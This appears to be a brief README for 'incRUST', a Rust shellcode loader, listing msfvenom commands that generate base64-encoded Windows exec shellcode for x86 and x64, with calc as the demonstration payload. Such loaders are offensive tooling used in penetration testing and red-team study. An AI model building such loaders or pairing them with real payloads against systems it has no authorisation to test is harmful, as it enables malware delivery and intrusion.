incRUST, a rust loader !

# Payload
## x86
msfvenom -f bin -p windows/exec cmd=calc exitfunc=thread -f base64

## x86_64
msfvenom -f bin -p windows/x64/exec cmd=calc exitfunc=thread -f base64